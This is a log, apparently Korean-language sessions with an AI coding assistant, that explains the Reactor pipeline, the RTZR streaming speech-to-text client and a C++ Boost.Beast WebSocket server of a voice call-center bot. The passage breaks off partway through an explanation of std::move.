      .block();  // ← 응답 올 때까지 기다림 (수 초)

  NIO 스레드에서 block()을 실행하면:

  NIO 스레드
      │
      ├── 전화A 음성 수신
      ├── LLM 응답 대기 중... (3초간 멈춤) ← 여기서 막힘
      │   이 3초 동안 전화B, C, D 모두 응답 못함 ❌
      └── LLM 응답 도착

  ---
  해결 — publishOn(Schedulers.boundedElastic())

  // CtiWebSocketHandler.java:60
  .publishOn(Schedulers.boundedElastic())
  .subscribe(
      result -> handleFinalStt(...)  // LLM, TTS 처리
  )

  publishOn  →  이 이후 작업을 다른 스레드에서 실행해라
  boundedElastic  →  대기가 긴 작업 전용 스레드 풀

  ---
  적용 후 흐름

  NIO 스레드                    boundedElastic 스레드
      │                               │
      ├── 음성 청크 수신               │
      ├── STT 결과 받음               │
      │                               │
      └── publishOn 이후 넘김 ────────▶│
                                      ├── LLM 응답 대기 (3초)
                                      ├── TTS 처리
                                      └── 결과 전송

  NIO 스레드는 자유로워짐
  전화B, C, D 정상 처리 ✅

  ---
  boundedElastic의 특징

  bounded  →  스레드 수에 상한이 있음 (무한정 생성 안 함)
  elastic  →  필요하면 늘어나고, 없으면 줄어듦

  기본값: CPU 코어 수 × 10 개까지 생성 가능

  ---
  한 줄 요약

  ▎ LLM 호출처럼 오래 걸리는 작업을 NIO 메인 스레드에서 분리해서, 전용 스레드 풀(boundedElastic)에서 실행하게 하는 설정입니다. NIO 스레드가 막히지 않아 다른
  ▎ 연결들이 정상 처리됩니다.

```

```
❯ `filter(SttResult::isFinal)` 가 뭐야?

● filter(SttService.SttResult::isFinal)

  STT 결과 중 최종 결과만 통과시키는 필터입니다.

  ---
  STT 결과가 두 종류인 이유

  STT는 실시간으로 음성을 인식하면서 결과를 계속 보냅니다.

  사용자: "안녕하세요 무엇을 도와드릴까요"

  STT 중간 결과 (isFinal = false):
      "안..."
      "안녕..."
      "안녕하세요..."
      "안녕하세요 무엇을..."
      "안녕하세요 무엇을 도와..."

  STT 최종 결과 (isFinal = true):
      "안녕하세요 무엇을 도와드릴까요"  ← 발화 끝, 확정

  ---
  코드에서 위치

  // CtiWebSocketHandler.java:57~64
  sttService.recognize(sink.asFlux(), callId)
      .filter(SttService.SttResult::isFinal)   // ← 여기
      .timeout(Duration.ofSeconds(60))
      .publishOn(Schedulers.boundedElastic())
      .subscribe(
          result -> handleFinalStt(...)  // 최종 결과만 여기 도달
      );

  ---
  filter 없이 실행하면

  중간 결과마다 LLM 호출 발생

  "안..."          → LLM 호출 ❌
  "안녕..."        → LLM 호출 ❌
  "안녕하세요..."  → LLM 호출 ❌
  "안녕하세요 무엇을 도와드릴까요" → LLM 호출

  → LLM이 수십 번 불필요하게 호출됨
  → 비용 낭비, 엉뚱한 응답

  ---
  filter 적용 후

  "안..."          → 통과 ❌ (isFinal=false)
  "안녕..."        → 통과 ❌ (isFinal=false)
  "안녕하세요..."  → 통과 ❌ (isFinal=false)
  "안녕하세요 무엇을 도와드릴까요" → 통과 ✅ (isFinal=true)
          ↓
     handleFinalStt() 실행
          ↓
     LLM → TTS → 응답

  ---
  :: 문법 (메서드 참조)

  // 아래 두 코드는 동일합니다
  .filter(SttService.SttResult::isFinal)

  .filter(result -> result.isFinal())

  :: 는 람다식을 더 짧게 쓰는 Java 문법입니다.

  ---
  한 줄 요약

  ▎ STT가 실시간으로 내보내는 중간 결과는 버리고, 발화가 끝난 최종 결과만 LLM으로 넘기는 필터입니다.

```

```
❯ `timeout(Duration.ofSeconds(60))` 가 뭐야?

● timeout(Duration.ofSeconds(60))

  60초 안에 데이터가 안 오면 에러로 처리하는 설정입니다.

  ---
  왜 필요한가

  사용자가 말을 멈추거나, 통화가 끊겼는데 서버가 모르는 상황:

  브라우저 연결 끊김 (서버는 모름)
          ↓
  STT가 결과를 기다리는 중...
          ↓
  영원히 대기 ❌ → 메모리, 스레드 점유 계속

  ---
  timeout 적용 후

  마지막 음성 청크 수신
          ↓
  60초 카운트 시작
          ↓
  60초 안에 isFinal 결과 도착  →  정상 처리 ✅
  60초 안에 아무것도 없으면    →  TimeoutException 발생

  ---
  TimeoutException 처리

  // CtiWebSocketHandler.java:194
  private void handleSttError(String callId, Throwable error) {
      if (error instanceof TimeoutException) {
          log.debug("[CTI] STT 타임아웃 (정상 종료) callId={}", callId);
          // ERROR 로그 아님 — 정상적인 통화 종료 상황
      } else {
          log.error("[CTI] STT 오류 callId={}", callId, error);
      }
  }

  TimeoutException을 에러가 아닌 debug로 처리하는 이유:

  통화 종료 정상 흐름:
      사용자 말 끊김 → 60초 대기 → TimeoutException
      → 이건 오류가 아니라 "조용히 종료"

  진짜 오류:
      STT 서버 다운, 네트워크 오류 등
      → log.error 로 처리

  ---
  timeout이 감시하는 것

  sttService.recognize(sink.asFlux(), callId)
      .filter(SttService.SttResult::isFinal)
      .timeout(Duration.ofSeconds(60))  // ← isFinal 결과를 60초 안에 못 받으면 종료

  중간 결과는 와도 카운트 리셋 안 됨
  isFinal=true 결과가 60초 안에 와야 함

  "안..."         (isFinal=false) →  카운트 계속
  "안녕..."       (isFinal=false) →  카운트 계속
  60초 경과                       →  TimeoutException

  ---
  한 줄 요약

  ▎ 사용자가 말을 멈추거나 연결이 끊겼을 때 60초 후 자동으로 STT 대기를 종료해서 서버 자원이 낭비되지 않게 막는 안전장치입니다.

```

```
❯ `subscribe` 가 뭐야?

● subscribe

  "데이터가 오면 이 함수를 실행해라" 고 등록하는 것입니다.

  ---
  구독 개념

  신문 구독으로 비유:

  신문사 (Flux)          구독자 (subscribe)
      │                       │
      │  신문 발행 (데이터)     │
      └──────────────────────▶│ 배달되면 읽음

  ---
  subscribe 전후 차이

  Reactor(Flux)는 구독하기 전까지 아무것도 실행되지 않습니다.

  // 이것만으로는 아무것도 실행 안 됨
  sttService.recognize(sink.asFlux(), callId)
      .filter(SttService.SttResult::isFinal)
      .timeout(Duration.ofSeconds(60))
      .publishOn(Schedulers.boundedElastic())

  // subscribe() 호출 순간 실행 시작
      .subscribe(
          result -> handleFinalStt(...),  // 데이터 도착 시
          error  -> handleSttError(...)   // 에러 발생 시
      );

  레시피만 적어둔 상태  →  subscribe()  →  실제 요리 시작

  ---
  이 코드의 subscribe 구조

  // CtiWebSocketHandler.java:61~64
  .subscribe(
      result -> handleFinalStt(session, callId, result.text(), capturedHistory),
      //  ↑
      // 정상 데이터(isFinal=true) 도착 시 실행

      error -> handleSttError(callId, error)
      //  ↑
      // TimeoutException 등 에러 발생 시 실행
  );

  ---
  전체 실행 순서

  subscribe() 호출
          ↓
  STT 스트림 감시 시작

  브라우저 음성 청크 도착
          ↓
  sink.tryEmitNext(chunk)
          ↓
  STT 처리
          ↓
  isFinal=false  →  filter에서 탈락, 무시
  isFinal=true   →  통과
          ↓
  subscribe 첫 번째 함수 실행
  handleFinalStt() → LLM → TTS → 응답

  ---
  Disposable — 구독 취소

  subscribe()는 Disposable을 반환합니다.

  // CtiWebSocketHandler.java:57
  Disposable d = sttService.recognize(...)
      ...
      .subscribe(...);

  // 통화 종료 시 구독 취소
  d.dispose();  // "신문 구독 해지"

  dispose() 호출
          ↓
  스트림 감시 중단
  timeout 타이머 중단
  스레드 반환

  ---
  한 줄 요약

  ▎ subscribe()는 "데이터가 오면 이 함수를 실행해라" 고 등록하는 시작 버튼입니다. 이것을 호출하기 전까지 파이프라인은 실행되지 않습니다.

```

```
❯ `capturedHistory` 가 뭐야?

● capturedHistory

  통화 중 대화 이력을 유지하기 위한 변수입니다.

  ---
  코드에서 위치

  // CtiWebSocketHandler.java:56~62
  List<LlmService.Message> capturedHistory = historyMap.get(session.getId());

  Disposable d = sttService.recognize(sink.asFlux(), callId)
      .filter(SttService.SttResult::isFinal)
      .timeout(Duration.ofSeconds(60))
      .publishOn(Schedulers.boundedElastic())
      .subscribe(
          result -> handleFinalStt(session, callId, result.text(), capturedHistory)
          //                                                        ↑
          //                                              대화 이력 전달
      );

  ---
  왜 필요한가

  LLM이 앞선 대화 내용을 기억해야 자연스러운 대화가 됩니다.

  사용자: "배가 아파요"
  봇:     "어느 부위가 아프신가요?"
  사용자: "윗배요"
  봇:     "언제부터 아프셨나요?"  ← 앞 대화를 기억해야 가능

  이전 대화 없이 LLM을 호출하면:

  사용자: "윗배요"
  봇:     "무엇을 도와드릴까요?"  ← 맥락 없는 엉뚱한 응답

  ---
  대화 이력이 쌓이는 과정

  // handleFinalStt():130
  history.add(new LlmService.Message("user", finalText));
  // 사용자 발화 추가

  // handleFinalStt():148
  history.add(new LlmService.Message("assistant", llmResponse));
  // 봇 응답 추가

  1번째 발화:
  history = [
      {role: "user",      content: "배가 아파요"}
      {role: "assistant", content: "어느 부위가 아프신가요?"}
  ]

  2번째 발화:
  history = [
      {role: "user",      content: "배가 아파요"}
      {role: "assistant", content: "어느 부위가 아프신가요?"}
      {role: "user",      content: "윗배요"}                  ← 추가
      {role: "assistant", content: "언제부터 아프셨나요?"}     ← 추가
  ]

  ---
  왜 captured 라는 이름인가

  // 주석 설명 — CtiWebSocketHandler.java:54
  // history를 클로저로 직접 캡처 —
  // afterConnectionClosed 이후 historyMap 정리와 무관하게 유지
  List<LlmService.Message> capturedHistory = historyMap.get(session.getId());

  historyMap                    capturedHistory
  (세션 종료 시 삭제됨)          (람다가 직접 참조)
         │                             │
         └──── 같은 List 객체 ─────────┘

  세션 종료 → historyMap에서 제거
           → capturedHistory는 람다 안에서 여전히 살아있음
           → 진행 중인 LLM 처리가 완료될 때까지 안전

  ---
  한 줄 요약

  ▎ 통화 중 사용자와 봇의 대화 이력을 누적해서 LLM에 전달하는 리스트입니다. 세션이 종료돼도 람다가 직접 참조하고 있어 처리 중인 작업이 안전하게 완료됩니다.

```

# WebSocker-RtzrWebSocketSttService
```
❯ STT 와 연결하고 스트림으로 흘려보내는 RtzrWebSocketSttService 도 설명해줘.

● 파일 먼저 읽을게요.

  Read 1 file (ctrl+o to expand)

● 소스 확인했습니다. 단계별로 설명드릴게요.

  ---
  전체 구조

  [브라우저]          [Spring 서버]              [RTZR STT 서버]
      │                    │                          │
      │ 음성 청크 전송      │                          │
      │──────────────────▶│                          │
      │              Sink(음성파이프)                  │
      │              audioStream(Flux)                │
      │                    │── WebSocket 연결 ────────▶│
      │                    │── 음성 청크 전송 ──────────▶│
      │                    │◀─ STT 결과(JSON) ─────────│
      │◀─ STT_FINAL 전송 ──│                          │

  ---
  1. 토큰 발급 — refreshToken() (line 152)

  RTZR API를 쓰려면 먼저 Access Token을 받아야 합니다.

  // line 157~166
  Map response = webClient.post()
      .uri("https://openapi.vito.ai/v1/authenticate")
      .bodyValue("client_id=...&client_secret=...")
      .retrieve()
      .bodyToMono(Map.class)
      .block();

  accessToken.set(response.get("access_token"));
  expireAt = response.get("expire_at");

  앱 시작 시(@PostConstruct) 1회 발급
          +
  5분마다 만료 확인, 10분 이내면 갱신(@Scheduled)

  ---
  2. RTZR WebSocket 연결 — recognize() (line 66)

  // line 68~71
  Request request = new Request.Builder()
      .url(buildWsUrl())                              // RTZR 서버 주소
      .header("Authorization", "Bearer " + token)    // 토큰 인증
      .build();

  WebSocket ws = okHttpClient.newWebSocket(request, listener);

  URL 파라미터 (line 141~148):

  wss://openapi.vito.ai/v1/transcribe:streaming
      ?sample_rate=8000          ← 전화 품질 (8kHz)
      &encoding=LINEAR16         ← PCM 포맷
      &use_itn=true              ← 숫자 변환 (삼만원 → 30,000원)
      &use_disfluency_filter=true ← 불필요한 소리 제거 (어.. 음..)

  ---
  3. RTZR에서 결과 수신 — onMessage() (line 80)

  RTZR이 보내는 JSON:

  {
      "final": false,
      "alternatives": [{ "text": "안녕하세요 무엇을" }]
  }

  // line 89~97
  boolean isFinal = node.path("final").asBoolean();
  String recognized = alternatives.get(0).path("text").asText();

  emitter.next(new SttResult(recognized, isFinal));
  //  ↑
  // Flux로 결과 흘려보냄 → CtiWebSocketHandler의 subscribe로 전달

  if (isFinal) {
      webSocket.close(1000, "done");  // 최종 결과 왔으면 연결 종료
  }

  ---
  4. 음성 청크를 RTZR로 전송 — audioStream.subscribe() (line 124)

  // line 124~134
  audioStream.subscribe(
      chunk -> ws.send(ByteString.of(chunk)),
      //  ↑
      // 브라우저 음성 청크 → RTZR로 전달

      error -> {
          ws.close(1000, "error");   // 에러 시 연결 종료
          emitter.error(error);
      },

      () -> {
          ws.send("EOS");            // 음성 끝 신호 전송
          // End Of Stream — RTZR에게 "더 이상 음성 없다"
      }
  );

  ---
  5. 연결 종료 처리

  // onClosed():110
  emitter.complete();    // RTZR 연결 종료 → Flux 완료 신호

  // onFailure():116
  emitter.error(t);      // 오류 발생 → Flux 에러 신호

  // onCancel():136
  emitter.onCancel(() -> ws.close(1000, "cancelled"));
  // CtiWebSocketHandler에서 dispose() 호출 시 → RTZR 연결도 정리

  ---
  전체 데이터 흐름

  브라우저
    │ 음성 청크 (binary)
    ▼
  CtiWebSocketHandler.handleBinaryMessage()
    │ sink.tryEmitNext(chunk)
    ▼
  Sink (음성 파이프)
    │ audioStream.subscribe()
    ▼
  RtzrWebSocketSttService
    │ ws.send(ByteString.of(chunk))   ← RTZR로 전송
    ▼
  RTZR STT 서버
    │ onMessage() — STT 결과 JSON
    ▼
  emitter.next(new SttResult(text, isFinal))
    │
    ▼
  CtiWebSocketHandler.subscribe()
    │ filter(isFinal) → handleFinalStt()
    ▼
  LLM → TTS → 브라우저 응답

  ---
  한 줄 요약

  ▎ 브라우저 음성 청크를 받아 RTZR WebSocket으로 흘려보내고, RTZR이 돌려주는 STT 결과를 Flux로 변환해서 CtiWebSocketHandler로 전달하는 중간 다리 역할입니다.

```

# WebSocket - cpp-ws-server 
```
❯ 브라우저와 통신하는 또 하나의 버전인 cpp-ws-server 에 대해서도 알려줘.

● 프로젝트에서 cpp-ws-server 관련 파일을 찾아볼게요.

  Searched for 1 pattern, listed 1 directory (ctrl+o to expand)

● 핵심 소스 파일들을 읽을게요.

  Read 2 files (ctrl+o to expand)

● 소스 확인했습니다. 설명드릴게요.

  ---
  cpp-ws-server란?

  Spring Boot 대신 C++로 만든 WebSocket 서버입니다.

  역할은 CtiWebSocketHandler.java와 완전히 동일합니다.

  ---
  Spring Boot 버전 vs C++ 버전 비교

  Spring Boot (Java):                C++ (cpp-ws-server):
    브라우저 ◀──▶ :8080/ws/cti         브라우저 ◀──▶ :9090
         ↓                                  ↓
    CtiWebSocketHandler             WsSession (WsServer.cpp)
         ↓                                  ↓
    RtzrWebSocketSttService         RtzrWebSocketSttService.cpp
         ↓                                  ↓
    LlmService (직접 Claude 호출)    SpringLlmService → Spring :8080
         ↓                                  ↓
    TtsService (직접 Google TTS)     SpringTtsService → Spring :8080

  C++ 버전은 STT만 직접 처리하고, LLM/TTS는 Spring Boot에 위임합니다.

  ---
  전체 구조

  [브라우저]
      │
      │ ws://localhost:9090
      ▼
  [C++ WsServer]                    [Spring Boot :8080]
      │                                    │
      ├── 음성 청크 수신 (doRead)           │
      ├── RTZR STT 직접 연결               │
      │       ↓ isFinal                   │
      ├── handleFinalStt()                 │
      │       ├── POST /llm/chat ─────────▶│ Claude API 호출
      │       │   ◀─ LLM 응답 ────────────│
      │       ├── POST /tts/synthesize ───▶│ Google TTS 호출
      │       │   ◀─ 음성(MP3) ───────────│
      │       └── 브라우저로 결과 전송

  ---
  주요 코드 위치

  1. 수신 — doRead() (line 50)

  // WsServer.cpp:50
  void doRead() {
      ws_.async_read(readBuf_, ...{
          if (isBinary) {
              stt_->sendChunk({p, p + payload.size()});  // 음성 청크 → STT
          } else {
              handleTextMessage(payload);                 // JSON 이벤트 처리
          }
          self->doRead();  // 다음 읽기 대기 (루프)
      });
  }

  2. STT 결과 → LLM → TTS — handleFinalStt() (line 108)

  // WsServer.cpp:120 — LLM/TTS는 별도 스레드에서 실행
  std::thread([self, hist]() mutable {
      auto llmRaw    = self->llm_->chat(hist, self->callId_);    // Spring에 위임
      auto audioBytes = self->tts_->synthesize(response, ...);   // Spring에 위임

      net::post(self->strand_, [self, ...]() {
          self->sendJson({{"type", "LLM_RESULT"}, ...});
          self->sendBinary(audioBytes);   // 음성 전송
          self->startStt();               // 다음 발화 대기
          self->sendJson({{"type", "BOT_READY"}});
      });
  }).detach();

  3. 송신 — sendJson(), sendBinary() (line 164~205)

  // 큐에 넣고 순서대로 전송
  void sendJson(json j) {
      writeQueue_.push_back(j.dump());
      if (!writing_) doWrite();
  }

  void sendBinary(std::vector<uint8_t> data) {
      writeQueue_.push_back(std::move(data));
      if (!writing_) doWrite();
  }

  ---
  Java 버전과 C++ 버전 핵심 차이

  ┌─────────────┬─────────────────────────┬─────────────────────────┐
  │             │   Java (Spring Boot)    │   C++ (cpp-ws-server)   │
  ├─────────────┼─────────────────────────┼─────────────────────────┤
  │ 동시성      │ Reactor (Flux, Sink)    │ Boost.Asio (async I/O)  │
  ├─────────────┼─────────────────────────┼─────────────────────────┤
  │ LLM/TTS     │ 직접 외부 API 호출      │ Spring Boot에 HTTP 위임 │
  ├─────────────┼─────────────────────────┼─────────────────────────┤
  │ 스레드 방식 │ boundedElastic 스레드풀 │ std::thread 별도 생성   │
  ├─────────────┼─────────────────────────┼─────────────────────────┤
  │ 송신 방식   │ session.sendMessage()   │ writeQueue_ + doWrite() │
  ├─────────────┼─────────────────────────┼─────────────────────────┤
  │ 포트        │ 8080                    │ 9090                    │
  └─────────────┴─────────────────────────┴─────────────────────────┘

  ---
  왜 C++ 버전이 있나

  Java (JVM):   시작 느림, 메모리 사용 많음
                GC(가비지컬렉션) pause 발생 가능

  C++:          시작 빠름, 메모리 적게 씀
                GC 없음 → 지연 없이 일정한 응답속도

  전화 콜센터는 응답 지연에 민감 → C++이 유리

  ---
  한 줄 요약

  ▎ Java CtiWebSocketHandler와 동일한 역할을 C++로 구현한 버전입니다. STT는 직접 처리하고 LLM/TTS는 Spring Boot에 위임하며, JVM 없이 더 빠르고 가볍게 동작합니다.

```

```
❯ `strand_` 가 뭐야?

● strand_

  "같은 strand에 올린 작업은 절대 동시에 실행되지 않는다" 는 보장입니다.

  ---
  왜 필요한가

  C++ 비동기 서버는 여러 스레드가 동시에 돌아갑니다.

  // main.cpp:41
  ioc.run();  // 여러 스레드가 동시에 이벤트 처리

  문제:

  스레드A: history_.push_back("user 발화")  ←─ 동시에
  스레드B: history_.push_back("assistant") ←─ 실행되면

  → history_ 데이터 깨짐 (race condition)

  ---
  strand가 해결하는 방법

  strand = 1개짜리 실행 대기열

  스레드A: net::post(strand_, 작업1)  →  대기열에 추가
  스레드B: net::post(strand_, 작업2)  →  대기열에 추가

  실행 순서:
  작업1 완료 후 → 작업2 실행
  (절대 동시 실행 없음)

  mutex(뮤텍스 잠금)와 비슷하지만 블로킹 없이 순서를 보장합니다.

  ---
  이 코드에서 strand 사용 위치

  읽기 — doRead() (line 51)

  ws_.async_read(readBuf_,
      net::bind_executor(strand_,   // ← strand 위에서 실행
          [self](beast::error_code ec, size_t) {
              // 음성 청크 처리
              stt_->sendChunk(chunk);
          }));

  LLM/TTS 결과 수신 — handleFinalStt() (line 139)

  // LLM/TTS는 별도 스레드에서 실행
  std::thread([self, ...]() {
      auto llmRaw = llm_->chat(...);  // 별도 스레드

      // 결과를 strand로 돌려보냄
      net::post(self->strand_,
          [self, ...]() {
              self->history_ = hist;     // strand 위에서 안전하게 접근
              self->sendJson(...);
              self->sendBinary(...);
          });
  }).detach();

  ---
  흐름으로 보면

  [별도 스레드] LLM 응답 대기 중...
  [별도 스레드] LLM 응답 도착

  net::post(strand_, 결과처리)
          ↓
  [strand 대기열]
      doRead 완료 처리
      → 결과처리 (history 업데이트, sendJson, sendBinary)

  → history_ 에 동시 접근 없음 ✅

  ---
  Java 버전과 비교

  Java (Spring Boot):
      .publishOn(Schedulers.boundedElastic())
      → 스레드풀로 전환, Reactor가 순서 보장

  C++ (cpp-ws-server):
      net::bind_executor(strand_, ...)
      net::post(strand_, ...)
      → Boost.Asio strand가 순서 보장

  역할은 동일합니다. 오래 걸리는 작업은 별도 스레드, 결과 처리는 strand로 돌아와서 안전하게 처리합니다.

  ---
  한 줄 요약

  ▎ 여러 스레드가 동시에 같은 데이터(history_, writeQueue_)를 건드리지 못하게 실행 순서를 보장하는 직렬 실행 대기열입니다.

```

```
❯ `writeQueue_` 가 뭐야?

● writeQueue_

  브라우저로 보낼 메시지를 순서대로 쌓아두는 대기열입니다.

  ---
  왜 필요한가

  WebSocket은 한 번에 하나씩만 전송할 수 있습니다.

  동시에 두 개를 보내려 하면:

  sendJson(STT_FINAL)   ──▶ async_write 시작
  sendBinary(음성데이터) ──▶ async_write 또 시작  ← 충돌 ❌

  Boost.Beast 규칙:
  이전 async_write가 완료되기 전에
  다음 async_write를 호출하면 undefined behavior
  (데이터 깨짐, 크래시 가능)

  ---
  writeQueue_ 구조

  // WsServer.cpp:162
  using WriteItem = std::variant<std::string, std::vector<uint8_t>>;
  //                              ↑ JSON 텍스트    ↑ 음성 바이너리
  // 둘 중 하나를 담을 수 있는 타입

  std::deque<WriteItem> writeQueue_;  // 선입선출 대기열
  bool writing_ = false;              // 현재 전송 중인지 여부

  ---
  동작 흐름

  // 넣는 쪽
  void sendJson(json j) {
      writeQueue_.push_back(j.dump());  // 대기열에 추가
      if (!writing_) doWrite();          // 전송 중 아니면 시작
  }

  void sendBinary(std::vector<uint8_t> data) {
      writeQueue_.push_back(std::move(data));  // 대기열에 추가
      if (!writing_) doWrite();
  }

  // 실제 전송
  void doWrite() {
      if (writeQueue_.empty()) { writing_ = false; return; }
      writing_ = true;

      WriteItem item = writeQueue_.front();  // 맨 앞 꺼냄
      writeQueue_.pop_front();

      // async_write 완료 후 → 다시 doWrite() 호출 (재귀)
      ws_.async_write(net::buffer(item), [self](...) {
          self->doWrite();  // 다음 항목 전송
      });
  }

  ---
  실제 전송 순서

  handleFinalStt() 실행:

  sendJson(STT_FINAL)    → [STT_FINAL]
  sendJson(LLM_RESULT)   → [STT_FINAL][LLM_RESULT]
  sendJson(TTS_TEXT)     → [STT_FINAL][LLM_RESULT][TTS_TEXT]
  sendBinary(음성)        → [STT_FINAL][LLM_RESULT][TTS_TEXT][음성]
  sendJson(BOT_READY)    → [STT_FINAL][LLM_RESULT][TTS_TEXT][음성][BOT_READY]

  전송:
  STT_FINAL 완료 → LLM_RESULT 완료 → TTS_TEXT 완료 → 음성 완료 → BOT_READY 완료

  ---
  Java 버전과 비교

  Java (Spring Boot):
      session.sendMessage(new TextMessage(...))
      session.sendMessage(new BinaryMessage(...))
      → Spring이 내부적으로 동시 전송 보호

  C++ (cpp-ws-server):
      writeQueue_ + doWrite()
      → 직접 순서 보장 구현 필요

  ---
  한 줄 요약

  ▎ WebSocket은 동시에 두 개를 보낼 수 없으므로, 보낼 메시지를 대기열에 쌓아두고 하나씩 순서대로 전송하는 큐입니다.

```

```
❯ `std::variant` 가 뭐야?

● std::variant

  "여러 타입 중 하나를 담을 수 있는 변수" 입니다.

  ---
  기본 개념

  // 둘 중 하나만 담을 수 있음
  std::variant<std::string, std::vector<uint8_t>> item;

  item = "안녕하세요";              // string으로 사용
  item = std::vector<uint8_t>{...}; // binary로 사용

  ---
  왜 필요한가

  writeQueue_에는 두 종류가 들어옵니다:

  sendJson()   → std::string        (JSON 텍스트)
  sendBinary() → std::vector<uint8_t> (음성 바이너리)

  하나의 대기열에 두 타입을 함께 담아야 합니다:

  writeQueue_ = [
      "STT_FINAL JSON",   ← string
      음성데이터[],         ← vector<uint8_t>
      "BOT_READY JSON",   ← string
  ]

  ---
  Union과의 차이

  C에도 비슷한 union이 있지만 위험합니다:

  // union — 타입 추적 안 함 (위험)
  union { std::string s; std::vector<uint8_t> v; } item;
  item.s = "hello";
  item.v;  // 뭐가 들었는지 모름 ❌ → 크래시

  // variant — 타입 추적 함 (안전)
  std::variant<std::string, std::vector<uint8_t>> item;
  item = "hello";
  std::get<std::string>(item);    // ✅
  std::get<std::vector<uint8_t>>(item);  // ❌ 예외 발생 (안전하게 실패)

  ---
  이 코드에서 꺼내는 방법

  // WsServer.cpp:181
  if (std::holds_alternative<std::string>(item)) {
      // string 타입이면
      auto msg = std::get<std::string>(item);
      ws_.text(true);          // 텍스트 프레임으로 전송
      ws_.async_write(net::buffer(msg), ...);

  } else {
      // vector<uint8_t> 타입이면
      auto buf = std::get<std::vector<uint8_t>>(item);
      ws_.binary(true);        // 바이너리 프레임으로 전송
      ws_.async_write(net::buffer(buf), ...);
  }

  ---
  Java 버전과 비교

  // Java — 다형성으로 해결
  session.sendMessage(new TextMessage(...));    // 텍스트
  session.sendMessage(new BinaryMessage(...)); // 바이너리
  // WebSocketMessage 인터페이스로 통일

  // C++ — variant로 해결
  std::variant<std::string, std::vector<uint8_t>>
  // 하나의 타입으로 둘 다 표현

  ---
  한 줄 요약

  ▎ string(JSON)과 vector<uint8_t>(음성) 두 타입을 하나의 대기열에 안전하게 함께 담기 위해 사용합니다.

```

```
❯ `std::holds_alternative` 가 뭐야?

● std::holds_alternative

  "variant가 지금 이 타입을 담고 있는가?" 를 확인하는 함수입니다.

  ---
  기본 사용법

  std::variant<std::string, std::vector<uint8_t>> item;
  item = "hello";

  std::holds_alternative<std::string>(item)         // true  ✅
  std::holds_alternative<std::vector<uint8_t>>(item) // false ❌

  ---
  이 코드에서 사용

  // WsServer.cpp:181
  if (std::holds_alternative<std::string>(item)) {
      // JSON 텍스트 → 텍스트 프레임으로 전송
      auto msg = std::get<std::string>(item);
      ws_.text(true);
      ws_.async_write(net::buffer(msg), ...);

  } else {
      // 음성 바이너리 → 바이너리 프레임으로 전송
      auto buf = std::get<std::vector<uint8_t>>(item);
      ws_.binary(true);
      ws_.async_write(net::buffer(buf), ...);
  }

  ---
  왜 먼저 확인해야 하나

  std::get은 타입이 맞지 않으면 예외를 던집니다:

  item = "hello";  // string이 들어있는데

  std::get<std::vector<uint8_t>>(item);  // ❌ std::bad_variant_access 예외

  그래서 순서가 중요합니다:

  holds_alternative로 타입 확인
          ↓
  맞는 타입으로 std::get 호출
          ↓
  안전하게 값 꺼냄

  ---
  실제 대기열 처리 흐름

  writeQueue_ = ["STT_FINAL", 음성[], "BOT_READY"]

  1번째: holds_alternative<string> → true  → 텍스트 전송
  2번째: holds_alternative<string> → false → 바이너리 전송
  3번째: holds_alternative<string> → true  → 텍스트 전송

  ---
  Java 버전과 비교

  // Java — instanceof로 타입 확인
  if (message instanceof TextMessage) {
      // 텍스트 처리
  } else if (message instanceof BinaryMessage) {
      // 바이너리 처리
  }

  // C++ — holds_alternative로 타입 확인
  if (std::holds_alternative<std::string>(item)) {
      // 텍스트 처리
  } else {
      // 바이너리 처리
  }

  역할이 동일합니다.

  ---
  한 줄 요약

  ▎ variant에서 std::get으로 값을 꺼내기 전에 타입이 맞는지 먼저 확인하는 함수입니다. Java의 instanceof와 같은 역할입니다.

```

```
❯ `std::get` 이 뭐야?

● std::get

  "variant에서 실제 값을 꺼내는 함수" 입니다.

  ---
  기본 사용법

  std::variant<std::string, std::vector<uint8_t>> item;
  item = "hello";

  // 타입으로 꺼내기
  std::string s = std::get<std::string>(item);  // "hello"

  ---
  성공 / 실패 경우

  item = "hello";  // string 저장

  std::get<std::string>(item);          // ✅ "hello" 반환
  std::get<std::vector<uint8_t>>(item); // ❌ std::bad_variant_access 예외

  ---
  이 코드에서 사용

  // WsServer.cpp:182~194
  if (std::holds_alternative<std::string>(item)) {

      // string 꺼내기
      auto msg = std::make_shared<std::string>(
          std::move(std::get<std::string>(item))
      );
      ws_.text(true);
      ws_.async_write(net::buffer(*msg), ...);

  } else {

      // vector<uint8_t> 꺼내기
      auto buf = std::make_shared<std::vector<uint8_t>>(
          std::move(std::get<std::vector<uint8_t>>(item))
      );
      ws_.binary(true);
      ws_.async_write(net::buffer(*buf), ...);
  }

  ---
  std::move와 함께 쓰는 이유

  std::get<std::string>(item)              // 복사 (메모리 2배)
  std::move(std::get<std::string>(item))   // 이동 (복사 없음)

  음성 데이터는 수백 KB — 복사하면 낭비이므로 std::move로 소유권을 넘깁니다.

  복사:  [원본]──복사──▶[새것]   원본도 남아있음 (메모리 2배)
  이동:  [원본]──이동──▶[새것]   원본은 비워짐   (메모리 1배)

  ---
  std::make_shared와 함께 쓰는 이유

  auto msg = std::make_shared<std::string>(std::move(...));

  async_write는 비동기 입니다. 전송 완료 전에 함수가 끝나버리면 데이터가 사라질 수 있어서, shared_ptr로 감싸 전송 완료까지 메모리를 유지합니다.

  async_write 시작
          ↓
  doWrite() 함수 종료  ← 여기서 msg가 사라지면 전송 중 데이터 깨짐 ❌
          ↓
  shared_ptr가 참조 유지 → 전송 완료까지 살아있음 ✅
          ↓
  async_write 완료 콜백 실행
          ↓
  shared_ptr 참조 해제 → 메모리 해제

  ---
  한 줄 요약

  ▎ variant에서 원하는 타입의 실제 값을 꺼내는 함수입니다. holds_alternative로 타입을 확인한 후 안전하게 사용합니다.

```

```
❯ `std::move` 가 뭐야?

● std::move

  "복사하지 말고 소유권을 넘겨라" 는 신호입니다.

  ---
  복사 vs 이동

  std::string a = "안녕하세요";

  // 복사
  std::string b = a;
  // a: "안녕하세요" (그대로)
  // b: "안녕하세요" (새로 복사)
  // 메모리 2배 사용

  // 이동
  std::string c = std::move(a);
  // a: ""          (비워짐)
  // c: "안녕하세요" (소유권 이전)
  // 메모리 1배 사용

  ---
  실생활 비유

  복사 = 문서를 복사기로 복사
        원본도 있고 사본도 있음 (종이 2장)

  이동 = 문서를 다른 사람에게 넘김
        이제 그 사람 것 (종이 1장)
        원래 내 손에는 없음

  ---
  이 코드에서 쓰는 이유

  음성 데이터는 수백 KB입니다:

  // writeQueue_ 에서 꺼낼 때
  WriteItem item = std::move(writeQueue_.front());  // 큐에서 이동
  writeQueue_.pop_front();

  // async_write에 넘길 때
